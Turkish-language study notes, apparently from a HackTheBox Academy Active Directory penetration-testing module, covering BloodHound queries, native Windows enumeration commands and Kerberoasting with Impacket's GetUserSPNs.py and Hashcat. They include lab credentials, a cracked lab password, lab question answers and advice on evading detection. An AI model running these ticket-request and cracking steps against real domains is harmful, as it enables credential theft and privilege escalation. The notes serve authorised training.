Şimdi Analiz sekmesinde önceden oluşturulmuş birkaç sorguya göz atalım. Find Computers with Unsupported Operating Systems sorgusu, eski yazılımları çalıştıran eski ve desteklenmeyen işletim sistemlerini bulmak için mükemmeldir. Bu sistemler, genellikle henüz güncellenemeyen veya değiştirilemeyen bazı ürünleri çalıştırdıkları için kurumsal ağlarda (özellikle eski ortamlarda) nispeten yaygındır. Bu hostları etrafta tutmak para tasarrufu sağlayabilir, ancak aynı zamanda ağa gereksiz güvenlik açıkları da ekleyebilirler. Eski hostlar MS08-067 gibi eski uzaktan kod çalıştırma güvenlik açıklarına karşı hassas olabilirler. Bir değerlendirme sırasında bu eski hostlara rastlarsak, onlara saldırmadan önce dikkatli olmalıyız (hatta müşterimizle kontrol etmeliyiz) çünkü kırılgan olabilirler ve kritik bir uygulama veya hizmet çalıştırıyor olabilirler. Müşterimize, bu hostları henüz kaldıramıyorlarsa ağın geri kalanından mümkün olduğunca ayırmasını tavsiye edebiliriz, ancak aynı zamanda bunları hizmet dışı bırakmak ve değiştirmek için bir plan oluşturmaya başlamalarını da tavsiye etmeliyiz.

Bu sorgu, biri Windows 7 diğeri Windows Server 2008 çalıştıran iki hostu göstermektedir (her ikisi de laboratuvarımızda “canlı” değildir). Bazen artık açık olmayan ancak AD'de hala kayıt olarak görünen hostlar görebiliriz. Raporlarımızda önerilerde bulunmadan önce her zaman “canlı” olup olmadıklarını doğrulamalıyız. Eski İşletim Sistemleri için yüksek riskli bir bulgu veya AD'deki eski kayıtları temizlemek için en iyi uygulama önerisi yazabiliriz.


#### Unsupported Operating Systems
![Pasted image 20241019213252.png](/img/user/resimler/Pasted%20image%2020241019213252.png)
Sıklıkla hostlarında local admin haklarına sahip kullanıcılar görürüz (belki de bir yazılım parçasını yüklemek için geçici olarak ve haklar asla kaldırılmamıştır) ya da bu hakları talep edecek kadar organizasyonda yüksek bir role sahiptirler (ihtiyaç duysalar da duymasalar da). Diğer zamanlarda, BT departmanında sunucu grupları üzerinde yerel yöneticiye sahip birden fazla grup veya hatta bir veya daha fazla bilgisayar üzerinde yerel yöneticiye sahip tüm Domain Users grubu gibi kuruluş genelinde dağıtılan aşırı yerel yönetici hakları görürüz. Bir veya daha fazla makine üzerinde bu haklara sahip bir kullanıcı hesabını devralırsak bu bize fayda sağlayabilir. Tüm kullanıcıların Local Admin haklarına sahip olduğu herhangi bir host olup olmadığını hızlıca görmek için Find Computers where Domain Users are Local Admin sorgusunu çalıştırabiliriz. Durum böyleyse, kontrol ettiğimiz herhangi bir hesap genellikle söz konusu host(lar)a erişmek için kullanılabilir ve bellekten kimlik bilgilerini alabilir veya diğer hassas verileri bulabiliriz.


#### Local Admins
![Pasted image 20241019213355.png](/img/user/resimler/Pasted%20image%2020241019213355.png)
Bu, çalıştırabileceğimiz faydalı sorguların sadece bir anlık görüntüsüdür. Bu modülde ilerledikçe, domain'deki diğer zayıflıkları bulmada yardımcı olabilecek birkaç tane daha göreceksiniz. BloodHound hakkında daha derinlemesine bir çalışma için Active Directory Bloodhound modülüne göz atın. Biraz zaman ayırın ve araca daha aşina olmak için Analiz sekmesindeki sorguların her birini deneyin. Ayrıca, ekranın altındaki Ham Sorgu kutusuna yapıştırarak [özel Cypher sorgularını ](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)denemeye değer.

 Etkileşime geçerken, domain'deki host'lara ve host'lardan transfer edilen her dosyayı ve diskteki yerlerini belgelememiz gerektiğini unutmayın. Bu, eylemlerimizi müşteri ile çelişkiye düşürmek zorunda kalırsak iyi bir uygulamadır. Ayrıca, görevin kapsamına bağlı olarak, izlerinizi örttüğünüzden ve görevin sonunda ortama koyduğunuz her şeyi temizlediğinizden emin olmak istersiniz.
 
Domain'in düzeni, güçlü ve zayıf yönleri hakkında harika bir resme sahibiz. Birçok kullanıcı için kimlik bilgilerine sahibiz ve kullanıcılar, gruplar, bilgisayarlar, GPO'lar, ACL'ler, yerel yönetici hakları, erişim hakları (RDP, WinRM, vb.), Hizmet Asıl Adları (SPN'ler) ile yapılandırılmış hesaplar ve daha fazlası gibi çok sayıda bilgiyi numaralandırdık. Linux ve Windows attack hosts'dan kimlik bilgileri ile ve kimlik bilgileri olmadan AD'yi numaralandırma pratiği yapmak için ayrıntılı notlarımız ve çok sayıda çıktımız var ve birçok farklı araçla denemeler yaptık. Sahip olduğumuz shell ile kısıtlanırsak veya araçları içe aktarma yeteneğimiz yoksa ne olur? Müşterimiz, tüm çalışmaları internet erişimi olmayan ve araçlarımızı yüklemenin hiçbir yolu olmayan ağları içindeki yönetilen bir hosttan yapmamızı isteyebilir. Başarılı bir saldırıdan sonra SYSTEM olarak bir host'a inebiliriz, ancak araçları yüklemenin çok zor olduğu veya mümkün olmadığı bir konumda olabiliriz. O zaman ne yapacağız? Bir sonraki bölümde, “Arazide Yaşarken” eylemleri nasıl gerçekleştireceğimize bakacağız.


Soru : Bloodhound kullanarak, INLANEFREIGHT domain'inde kaç tane Kerberoastable hesabı olduğunu belirleyin. (Cevap olarak sayıyı gönderin)
Cevap : 13

1- xfreerdp /u:htb-student@inlanefreight.local /p:Academy_student_AD! /v:10.129.95.206

2- 
![Pasted image 20241019214124.png](/img/user/resimler/Pasted%20image%2020241019214124.png)
- **`-c All`**:
    
    - **`-c`** parametresi, hangi toplama metodunun kullanılacağını belirtir.
    - **`All`**, tüm toplama modlarını kullanarak domain üzerindeki çeşitli bilgileri toplayacağını ifade eder.
        - Bu modlar şunları içerir:
            - **Group Memberships**: Grup üyelikleri.
            - **Sessions**: Kullanıcı oturumları.
            - **Trusts**: Domain güven ilişkileri.
            - **ACLs**: Active Directory'deki erişim kontrol listeleri.
            - **SPNs**: Kerberoast saldırılarına açık hesapları tespit etmek için Service Principal Name (SPN) bilgileri.
            - **Shares**: Dosya paylaşım bilgileri.
    
    **`All`** kullanıldığında, SharpHound tüm bu bilgileri toplar.
    
- **`--zipfilename ILFREIGHT`**:
    
    - **`--zipfilename`** parametresi, toplanan verilerin bir zip dosyası içinde saklanacağını ve bu zip dosyasına ne isim verileceğini belirler.
    - Bu durumda, dosya adı **`ILFREIGHT.zip`** olacaktır.
    - Bu zip dosyası, daha sonra **BloodHound** arayüzüne yüklenerek analiz edilebilir.
![Pasted image 20241019214211.png](/img/user/resimler/Pasted%20image%2020241019214211.png)

* zip dosyasını upload data seçeneği ile bloodhound'a verdik . 


Soru : Hangi PowerView işlevi, bir kullanıcının lokal veya remote host'a yönetici erişimine sahip olup olmadığını test etmemizi sağlar?
Cevap : Test-AdminAccess

Soru : Snaffler'ı çalıştırın ve okunabilir bir web yapılandırma dosyası arayın. Dosya içindeki bağlantı dizesindeki kullanıcının adı nedir?
cevap : 
![Pasted image 20241019221441.png](/img/user/resimler/Pasted%20image%2020241019221441.png)


### Arazide Yaşamak
Modülün başlarında, AD ortamını numaralandırmak için çeşitli araçlar ve teknikler (hem kimlik doğrulamalı hem de kimlik doğrulamasız) uyguladık. Bu yöntemler, aracı dayanak host'a yüklememizi veya çekmemizi ya da ortamın içinde bir saldırı host'u bulundurmamızı gerektiriyordu. Bu bölümde, numaralandırma işlemimizi gerçekleştirmek için yerel Windows araçlarını kullanmaya yönelik çeşitli teknikler tartışılacak ve ardından bu teknikler Windows saldırı hostumuzda uygulanacaktır.


### Senaryo
Müşterimizin bizden AD ortamını internet erişimi olmayan yönetilen bir hosttan test etmemizi istediğini ve araçları yüklemeye yönelik tüm çabaların başarısız olduğunu varsayalım. Müşterimiz ne tür numaralandırmanın mümkün olduğunu görmek istiyor, bu nedenle “arazide yaşamaya” veya yalnızca Windows/Active Directory'ye özgü araçları ve komutları kullanmaya başvurmamız gerekecek. Bu aynı zamanda daha gizli bir yaklaşım olabilir ve önceki bölümlerde araçları ağa çekmek kadar çok günlük girişi ve uyarı oluşturmayabilir. Günümüzde çoğu kurumsal ortam, Windows Defender veya kurumsal EDR gibi host tabanlı savunmalarının üzerinde IDS/IPS, güvenlik duvarları ve pasif sensörler ve araçlar da dahil olmak üzere bir tür ağ izleme ve günlük kaydına sahiptir. Ortama bağlı olarak, “normal” ağ trafiğinin bir temelini alan ve anormallikleri arayan araçlara da sahip olabilirler. Bu nedenle, dışarıdan ortama araçlar çekmeye başladığımızda yakalanma şansımız katlanarak artar.


### Host & Network Recon için Env Komutları
İlk olarak, üzerinde bulunduğumuz host hakkında bize daha fazla bilgi vermek için kullanılabilecek birkaç temel çevresel komutu ele alacağız.


#### Basic Enumeration Commands

- **==hostname== :  - Bilgisayarın adını yazdırır.
- ==**[System.Environment]::OSVersion.Version**== - İşletim sisteminin sürümünü ve revizyon seviyesini yazdırır.
- ==**wmic qfe get Caption,Description,HotFixID,InstalledOn**== - Host'a uygulanan yamaları ve düzeltmeleri yazdırır.
- ==**ipconfig /all**== - Ağ adaptörlerinin durumunu ve yapılandırmalarını yazdırır.
- ==**set**== - Mevcut oturum için ortam değişkenlerinin listesini görüntüler (CMD-prompt'ta çalıştırılır).
- ==**echo %USERDOMAIN%**== - Hostun ait olduğu domain adını yazdırır (CMD-prompt'ta çalıştırılır).
- ==**echo %logonserver%**== - Hostun oturum açtığı Domain Controller'ı yazdırır (CMD-prompt'ta çalıştırılır).


#### Basic Enumeration
![Pasted image 20241020010651.png](/img/user/resimler/Pasted%20image%2020241020010651.png)

Yukarıdaki komutlar bize hostun içinde bulunduğu durumun yanı sıra bazı temel ağ ve domain bilgilerinin hızlı bir ilk resmini verecektir. Yukarıdaki bilgileri tek bir [systeminfo](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo) komutu ile kapsayabiliriz.

![Pasted image 20241020010735.png](/img/user/resimler/Pasted%20image%2020241020010735.png)
Yukarıda görüldüğü gibi systeminfo komutu, host'un bilgilerinin bir özetini bizim için tek bir düzenli çıktıda yazdıracaktır. Tek bir komut çalıştırmak daha az günlük oluşturacaktır, bu da host üzerinde bir savunmacı tarafından fark edilme şansımızın daha az olduğu anlamına gelir.






........




# Kerberoasting - from Linux
Bu noktaya kadar yaptığımız numaralandırma bize domainin ve olası problemlerinin geniş bir resmini verdi. Kullanıcı hesaplarını numaralandırdık ve bazılarının Service Principal Names ile yapılandırıldığını görebiliyoruz. Şimdi hedef domain'de yanlara doğru hareket etmek ve ayrıcalıkları yükseltmek için bundan nasıl yararlanabileceğimizi görelim.


### 1. **Kerberoasting Nedir?**

- **Kerberoasting**, bir saldırganın **Active Directory** (AD) ortamında **SPN (Service Principal Name)** hesaplarını hedef aldığı bir saldırı türüdür.
- Amaç, servis hesaplarına ait Kerberos biletlerini ele geçirip, parolalarını kırarak bu hesapların yetkilerini kötüye kullanmaktır.


### 2. **SPN (Service Principal Name) Nedir?**

- SPN, bir servisi ve o servisin hangi hesapla çalıştığını tanımlayan bir kimliktir.
- Örneğin, SQL Server gibi bir hizmet çalıştıran bir sunucu için bu hizmetin tanımlandığı bir SPN vardır. SPN, hizmetin kimliğini tanımlar ve hizmet ile ilişkilendirilen bir domain hesabına bağlanır.
- SPN'ler, Kerberos protokolü kullanarak bir hizmetin doğru kullanıcı tarafından erişilip erişilmediğini kontrol etmek amacıyla kullanılır.


### 3. **Herhangi Bir Domain Kullanıcısı Bilet Talep Edebilir**

- **Active Directory** içindeki herhangi bir domain kullanıcısı, başka bir hizmetin (örneğin, bir SQL Server) çalıştığı domain hesabı için **Kerberos bileti** talep edebilir.
- Bilet almak, hizmeti kullanabilmek için kimlik doğrulamanın bir parçasıdır.


### 4. **Kerberos Bileti (TGS-REP) Nedir?**

- Bu bilet, hizmetin parolası veya NTLM hash’i ile şifrelenmiştir.
- Yani saldırgan, bu bileti ele geçirdiğinde, bileti offline olarak (çevrimdışı) bir brute-force saldırısıyla çözmeye çalışabilir. Bu, saldırganın o hizmetin parolasını kırmaya çalıştığı anlamına gelir.


### 5. **Servis Hesapları Genellikle Local Admin’dir**

- Servis hesapları her zaman yüksek yetkili (Domain Admin) olmasa bile, genellikle **local admin** (yerel yönetici) yetkilerine sahip olabilir.
- Yani bu hesaplar, çalıştıkları sunucularda yönetici yetkilerine sahiptir. Bu da saldırgan için büyük bir avantajdır çünkü ele geçirilen bir servis hesabı, başka sistemlerde de yönetici ayrıcalıkları elde etmek anlamına gelebilir.


### 6. **Birçok Servis Hesabı Zayıf Parolalara Sahiptir**

- Servis hesapları çoğunlukla zayıf veya tekrar eden parolalarla yapılandırılır.
- Bu durum, saldırganların brute-force saldırılarıyla parolaları kırmasını kolaylaştırır. Bazı durumlarda servis hesaplarının parolası, kullanıcı adıyla aynı olabilir.

### 7. **Bir Kerberos Biletiyle Komut Çalıştırılamaz, Ama Parola Kırılabilir**

- Kerberos biletine sahip olmak, doğrudan o hesapla komut çalıştırmak anlamına gelmez. Ancak bilet, hizmet hesabının **NTLM hash’i** ile şifrelenmiştir.
- Saldırgan, bu hash’i çözerek (örneğin **Hashcat** kullanarak) hizmet hesabının açık metin parolasını elde edebilir.

### 8. **Zayıf Parola Kırıldığında Ne Olur?**

- Örneğin, SQL Server gibi bir hizmet hesabının parolası kırıldığında, saldırgan bu hesabı kullanarak **local admin** (yerel yönetici) yetkilerine sahip olur.
- Domain Admin olmasa bile, birden fazla sunucuda yönetici haklarına sahip olabilir. Bu da saldırgana büyük bir kontrol sağlar.

### 9. **Düşük Yetkili Hesaplar Bile Kullanılabilir**

- Kerberoasting saldırısı yoluyla ele geçirilen hesap düşük yetkili bir kullanıcı hesabı bile olsa, saldırgan bu hesabı kullanarak o hizmete yönelik biletler oluşturabilir.
- Örneğin, MSSQL hizmetine sysadmin olarak erişim sağlanabilir ve sunucu üzerinde **xp_cmdshell** gibi komutlar çalıştırılarak tam kontrol elde edilebilir.


### Özet:

Kerberoasting, Kerberos biletlerini offline brute-force saldırısı ile kırarak, service  hesaplarına ait parolaları ele geçirmeyi amaçlayan bir saldırıdır. Bu parolalar, saldırgana domain’deki başka sistemlerde yanal hareket etme ve ayrıcalık yükseltme fırsatı tanır. Özellikle zayıf veya tekrar eden parolalara sahip servis hesapları bu saldırıya karşı savunmasızdır.

Bu tekniğin kökenine ilginç bir bakış için Tim Medin'in Derbycon 2014'te yaptığı ve Kerberoasting'i dünyaya tanıttığı [konuşmaya](https://www.youtube.com/watch?v=PUyhlN-E5MU) göz atın.



### Kerberoasting - Saldırının Gerçekleştirilmesi
Bir ağdaki konumunuza bağlı olarak, bu saldırı birden fazla şekilde gerçekleştirilebilir:
* Domain'e bağlı olmayan bir Linux host'tan geçerli domain kullanıcı kimlik bilgilerini kullanarak.
* Domain'e katılmış bir Linux host'tan keytab dosyasını aldıktan sonra root olarak.
* Domain kullanıcısı olarak kimliği doğrulanmış, domain'e katılmış bir Windows host'tan.
* Domain hesabı çerçevesinde bir shell ile domain'e katılmış bir Windows host'tan.
* Domain'e katılmış bir Windows host üzerinde SYSTEM olarak.
* Domain'e bağlı olmayan bir Windows host'tan [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly kullanarak.

Saldırıyı gerçekleştirmek için çeşitli araçlar kullanılabilir:

* Impacket'in [GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) dosyasını domain'e bağlı olmayan bir Linux host'tan çalıştırın.
* Built-in setspn.exe Windows binary, PowerShell ve Mimikatz'ın bir kombinasyonu.
* Windows'tan PowerView, [Rubeus](https://github.com/GhostPack/Rubeus) ve diğer PowerShell komut dosyaları gibi araçları kullanarak.

Kerberoasting yoluyla bir TGS bileti edinmek size geçerli kimlik bilgileri kümesini garanti etmez ve biletin açık metin parolasını elde etmek için yine de Hashcat gibi bir araçla çevrimdışı olarak kırılması gerekir. TGS biletlerinin kırılması NTLM hash'leri gibi diğer formatlardan daha uzun sürer, bu nedenle zayıf bir parola belirlenmediği sürece standart bir kırma donanımı kullanarak açık metni elde etmek zor veya imkansız olabilir.


### Saldırının Etkisi
Bir domain içinde yanlara doğru hareket etmek veya ayrıcalıkları artırmak için harika bir yol olsa da Kerberoasting ve SPN'lerin varlığı bize herhangi bir erişim seviyesini garanti etmez. Bir TGS biletini kırdığımız ve doğrudan Domain Admin erişimi elde ettiğimiz ya da domain tehlikeye atma yolunda ilerlememize yardımcı olacak kimlik bilgilerini elde ettiğimiz bir ortamda olabiliriz. Diğer zamanlarda saldırıyı gerçekleştirebilir ve bazılarını kırabileceğimiz birçok TGS bileti alabiliriz, ancak kırılanların hiçbiri ayrıcalıklı kullanıcılar için değildir ve saldırı bize herhangi bir ek erişim sağlamaz. İlk iki durumda bulguyu raporumda muhtemelen yüksek riskli olarak yazardım. Üçüncü durumda, Kerberoast yapabiliriz ve güçlü bir GPU parola kırma donanımında Hashcat ile günlerce süren kırma denemelerinden sonra bile tek bir TGS biletini kıramayabiliriz. Bu senaryoda, bulguyu yine de yazardım, ancak müşteriyi domain'deki SPN'lerin riskinden haberdar etmek için orta riskli bir soruna indirirdim (bu güçlü parolalar her zaman daha hafif bir parola ile değiştirilebilir veya çok kararlı bir saldırgan Hashcat kullanarak biletleri kırabilir), ancak saldırıyı kullanarak herhangi bir domain hesabının kontrolünü ele geçiremediğim gerçeğini dikkate alırdım. Raporlarımızda bu tür ayrımlar yapmak ve hafifletici kontroller (çok güçlü parolalar gibi) mevcut olduğunda bir bulgu riskini azaltmanın ne zaman uygun olduğunu bilmek hayati önem taşır.



### Saldırının Gerçekleştirilmesi
Kerberoasting saldırıları artık otomatik araçlar ve komut dosyaları kullanılarak kolayca yapılabilmektedir. Bu saldırıyı hem bir Linux hem de bir Windows saldırı hostundan çeşitli şekillerde gerçekleştirmeyi ele alacağız. İlk olarak bunun bir Linux hostundan nasıl yapılacağını gözden geçirelim. Bir sonraki bölümde, saldırıyı gerçekleştirmenin “yarı manuel” bir yolunu ve yaygın açık kaynak araçlarını kullanan iki hızlı, otomatik saldırıyı, hepsi bir Windows saldırı hostundan ele alacağız.


### GetUserSPNs.py ile Kerberoasting

Kerberoasting Saldırısına Başlamadan Önce Ne Gereklidir?

- **Domain Kullanıcı Kimlik Bilgileri**:
    
    - Bir Kerberoasting saldırısına başlamadan önce, **domain ortamında geçerli bir kullanıcı hesabı** veya **NTLM hash'i** gibi kimlik bilgilerine sahip olmanız gerekir. Bu, domain'e giriş yapmış herhangi bir kullanıcı olabilir.
    - Eğer Impacket gibi araçlar kullanıyorsanız, sadece bir NTLM hash (parolanın hashlenmiş hali) bile yeterlidir. Yani, parolanın kendisine bile ihtiyacınız yok, sadece o kullanıcının hash’i yeterli olabilir.

- **Domain Kullanıcısı Bağlamında Bir Shell veya SYSTEM Yetkisi**:
    
    - Domain kullanıcısı olarak komutları çalıştırabileceğiniz bir ortam, yani **shell** erişimine ihtiyacınız var.
    - Örneğin, bir sunucuda, o domain kullanıcısı adına komut çalıştırabilen bir oturuma sahip olmanız gerekiyor.
    - Ayrıca, bazı durumlarda SYSTEM yetkilerine sahip olmanız (yani işletim sistemi üzerinde tam kontrol sahibi olmanız) saldırıyı kolaylaştırabilir, ancak bu şart değildir.

- **Domain Controller’ın Hangisi Olduğunu Bilmek**:
    
    - Kerberoasting saldırısını başlatmadan önce, domain ortamında **Domain Controller (DC)** olarak adlandırılan ana sunucuyu bilmeniz gerekiyor.
    - **Domain Controller**, tüm domain kullanıcıları ve servis hesaplarının kayıtlı olduğu sunucudur. Saldırıyı gerçekleştirebilmek için, hangi sunucunun bu DC rolünde olduğunu öğrenmeniz ve ona yönelik sorgular yapmanız gerekmektedir.

[Buradan](https://github.com/fortra/impacket) alabileceğimiz Impacket araç setini kurarak başlayalım. Depoyu klonladıktan sonra dizine cd ile girip aşağıdaki şekilde kurulum yapabiliriz:


### Pip Kullanarak Impacket Yükleme
```shell-session
M1R4CKCK@htb[/htb]$ sudo python3 -m pip install .

Processing /opt/impacket
  Preparing metadata (setup.py) ... done
Requirement already satisfied: chardet in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (4.0.0)
Requirement already satisfied: flask>=1.0 in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (1.1.2)
Requirement already satisfied: future in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (0.18.2)
Requirement already satisfied: ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5 in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (2.8.1)
Requirement already satisfied: ldapdomaindump>=0.9.0 in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (0.9.3)

<SNIP>
```

Bu, tüm Impacket araçlarını yükleyecek ve onları atak hostumuzdaki herhangi bir dizinden çağırabilmemiz için PATH'imize yerleştirecektir. Impacket, alıştırmaları takip etmek ve çalışmak için bu bölümün sonunda ortaya çıkarabileceğimiz saldırı hostuna zaten yüklenmiştir. Aracı -h bayrağı ile çalıştırmak yardım menüsünü getirecektir.


### GetUserSPNs.py Yardım Seçeneklerini Listeleme
```shell-session
M1R4CKCK@htb[/htb]$ GetUserSPNs.py -h
```

### **1. Başlangıç Adımı: SPN Listesini Toplamak**

- **SPN’lerin (Service Principal Name) Listesini Toplamak:** İlk adımda domain ortamındaki SPN'lerin bir listesini toplamak istiyoruz. SPN'ler, domain içindeki hizmetlerin hangi kullanıcı hesaplarıyla çalıştığını gösterir. Bu liste, hangi hizmet hesaplarının potansiyel olarak saldırıya açık olduğunu belirlemek için gereklidir.

### **2. Gerekli Şeyler**

Bu işlemi yapabilmek için bazı bilgilere ve araçlara ihtiyacımız var:

- **Domain Kimlik Bilgileri**: Domain ortamında geçerli bir kullanıcı adı ve parola. Bu, domain ortamında oturum açmış bir kullanıcının kimlik bilgileri olabilir.
- **Domain Controller’ın IP Adresi**: Domain Controller, domain’deki tüm kullanıcı hesaplarının ve hizmet hesaplarının kayıtlı olduğu merkezi sunucudur. Hangi makinenin bu rolü üstlendiğini bilmemiz gerekir ki ona doğru sorgulamalar yapabilelim.

### **3. Kimlik Doğrulaması**

Domain Controller’a bağlanıp SPN listesini almak için kimlik doğrulaması yapmanız gerekir. Bunu birkaç farklı şekilde yapabilirsiniz:

- **Açık Metin Parolası**: Kullanıcının gerçek parolasıyla.
- **NT Parola Hash’i**: Kullanıcının parolasının hashlenmiş hali.
- **Kerberos Bileti**: Eğer bir Kerberos bileti varsa bu da kimlik doğrulama için kullanılabilir.

Ancak, bu örnekte biz **parola** kullanacağız.

### **4. SPN Listesi Nasıl Alınır?**

- Bir **komut** girip ardından kimlik bilgilerini kullanarak, domain’deki **tüm SPN hesaplarının bir listesini** oluşturacağız.
- Bu komut çalıştırıldığında, domain ortamındaki hizmet hesaplarının bir listesi dönecek. Bu liste, hangi hizmetlerin hangi hesaplarla çalıştığını gösterecek.


### **5. Çıktıyı Analiz Etmek**

- Bu listede, bazı hizmet hesaplarının **Domain Admins** grubunun üyesi olduğunu görebiliriz. Domain Admins grubu, çok yüksek yetkilere sahip hesapları içerir. Eğer bu hesaplardan birinin biletini alıp parolasını kırmayı başarırsak, bu hesapla domain’in kontrolünü ele geçirebiliriz.

### **6. Hedef Belirlemek**

- Bu listeyi analiz ederken, **grup üyeliklerine** dikkat etmeliyiz. Hangi hesaplar **yüksek yetkilere** sahip, hangi hesaplar **daha kolay kırılabilecek zayıf parolalara** sahip olabilir? Eğer düşük güvenlikli bir hizmet hesabı bulursak, parolasını kırarak domain'de yanal ya da dikey hareket edebiliriz.
    - **Yanal Hareket**: Diğer makinelerde yetkili kullanıcı olabilmek.
    - **Dikey Hareket**: Daha yüksek yetkilere sahip bir kullanıcı hesabına erişim sağlamak.



### GetUserSPNs.py ile SPN Hesaplarını Listeleme
```shell-session
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```
![Pasted image 20241020215548.png](/img/user/resimler/Pasted%20image%2020241020215548.png)
![Pasted image 20241020215600.png](/img/user/resimler/Pasted%20image%2020241020215600.png)
![Pasted image 20241020215610.png](/img/user/resimler/Pasted%20image%2020241020215610.png)

Artık -request bayrağını kullanarak "çevrimdışı işlem için" tüm TGS biletlerini çekebiliriz. TGS biletleri, çevrimdışı şifre kırma denemeleri için Hashcat veya John the Ripper'a kolayca sağlanabilecek bir biçimde çıktı olarak verilecektir.


### Tüm TGS Biletlerini Talep Etme

```shell-session
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```
![Pasted image 20241020220027.png](/img/user/resimler/Pasted%20image%2020241020220027.png)

Ayrıca daha hedefli olabilir ve yalnızca belirli bir hesap için TGS bileti talep edebiliriz. Sadece sqldev hesabı için bir tane talep etmeyi deneyelim.


### Tek TGS bileti talep etme
```shell-session
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```
![Pasted image 20241020220233.png](/img/user/resimler/Pasted%20image%2020241020220233.png)

Bu bilet elimizdeyken, Hashcat kullanarak kullanıcının şifresini çevrimdışı olarak kırmayı deneyebiliriz. Eğer başarılı olursak, Domain Admin haklarına sahip olabiliriz.

Çevrimdışı kırmayı kolaylaştırmak için, TGS biletlerini daha sonra saldırı sistemimizde Hashcat kullanarak çalıştırılabilecek veya bir GPU kırma donanımına taşınabilecek bir dosyaya yazmak için -outputfile bayrağını kullanmak her zaman iyidir.



### TGS Biletini Bir Çıktı Dosyasına Kaydetme

```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```
Burada sqldev kullanıcısı için TGS biletini sqldev_tgs adlı bir dosyaya yazdık. Şimdi Hashcat hash modu 13100'ü kullanarak bileti çevrimdışı olarak kırmayı deneyebiliriz.



### Hashcat ile Çevrimdışı Bilet Kırma
```shell-session
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

Kullanıcının parolasını database! olarak başarıyla kırdık! Son adım olarak, erişimimizi doğrulayabilir ve INLANEFREIGHT.LOCAL domainindeki hedef DC'ye kimlik doğrulaması yapabildiğimiz için gerçekten Domain Admin haklarına sahip olduğumuzu görebiliriz. Buradan, istismar sonrası gerçekleştirebilir ve domain'i tehlikeye atacak diğer yollar ve diğer önemli kusurlar ve yanlış yapılandırmalar için numaralandırmaya devam edebiliriz.


### Domain Controller'a Karşı Kimlik Doğrulamayı Test Etme
![Pasted image 20241020220655.png](/img/user/resimler/Pasted%20image%2020241020220655.png)


### Daha Fazla 
Artık bir Linux saldırı hostundan Kerberoasting konusunu ele aldığımıza göre, bir Windows hostundan süreci gözden geçireceğiz. Testlerimizin bir kısmını ya da tamamını bir Windows hosttan yapmaya karar verebiliriz, müşterimiz bize test yapmamız için bir Windows host sağlayabilir ya da bir hostu tehlikeye atabilir ve daha sonraki saldırılar için bir atlama noktası olarak kullanmamız gerekebilir. Değerlendirmelerimiz sırasında Windows hostları nasıl kullandığımızdan bağımsız olarak, çok yönlü kalabilmek için hem Linux hem de Windows hostlardan mümkün olduğunca çok saldırıyı nasıl gerçekleştireceğimizi anlamak çok önemlidir, çünkü bir değerlendirmeden diğerine bize ne atılacağını asla bilemeyiz.


Soru :  SAPService hesabı için TGS biletini alın. Bileti çevrimdışı olarak kırın ve şifreyi cevabınız olarak gönderin.

Cevap : 

1- ssh ile atack hostunda bağlandım . 

2- 

![Pasted image 20241020222321.png](/img/user/resimler/Pasted%20image%2020241020222321.png)

![Pasted image 20241020222506.png](/img/user/resimler/Pasted%20image%2020241020222506.png)

3- Hashcat ile şifreyi kırdık 
![Pasted image 20241020223215.png](/img/user/resimler/Pasted%20image%2020241020223215.png)



Soru : SAPService kullanıcısı Domain Controller üzerinde hangi güçlü local grubun üyesidir?
Cevap : 

Cevap :  ==Account Operators==

![Pasted image 20241020223410.png](/img/user/resimler/Pasted%20image%2020241020223410.png)

![Pasted image 20241020223626.png](/img/user/resimler/Pasted%20image%2020241020223626.png)


# Kerberoasting - from Windows


### Kerberoasting - Yarı Manuel yöntem
Rubeus gibi araçlar var olmadan önce, Kerberos biletlerini çalmak veya taklit etmek karmaşık ve manuel bir süreçti. Taktik ve savunmalar geliştikçe, artık Windows'tan Kerberoasting işlemini birden fazla yolla gerçekleştirebiliyoruz. Bu yola başlamak için manuel rotayı keşfedeceğiz ve ardından daha otomatik araçlara geçeceğiz. Domain'deki SPN'leri listelemek için built-in [setspn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) binary ile başlayalım.


#### SPN'leri setspn.exe ile numaralandırma

```cmd-session
C:\htb> setspn.exe -Q */*

Checking domain DC=INLANEFREIGHT,DC=LOCAL
CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
        exchangeAB/ACADEMY-EA-DC01
        exchangeAB/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        TERMSRV/ACADEMY-EA-DC01
        TERMSRV/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL

<SNIP>

CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        backupjob/veam001.inlanefreight.local
CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        sts/inlanefreight.local

<SNIP>

